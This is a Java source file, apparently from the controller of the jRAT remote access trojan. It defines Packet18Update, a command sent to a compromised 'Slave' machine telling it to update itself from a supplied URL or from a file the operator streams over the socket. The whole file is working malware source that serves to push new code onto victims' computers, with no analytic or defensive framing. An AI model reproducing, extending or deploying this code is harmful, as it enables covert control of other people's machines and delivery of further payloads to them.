package su.jrat.client.packets.outgoing;

import java.io.DataOutputStream;
import java.io.File;

import su.jrat.client.Slave;
import su.jrat.common.io.FileIO;


public class Packet18Update extends AbstractOutgoingPacket {

	private String url;
	private File file;
	private boolean local;

	public Packet18Update(String url) {
		this.url = url;
		this.file = null;
		this.local = false;
	}
	
	public Packet18Update(File file) {
		this.url = "";
		this.local = true;
		this.file = file;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(url);
		slave.writeBoolean(local);
		
		if (local) {
			try {
				new FileIO().writeFile(file, slave.getSocket(), slave.getDataOutputStream(), slave.getDataInputStream(), null, slave.getKey());
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}

	@Override
	public byte getPacketId() {
		return 18;
	}

}
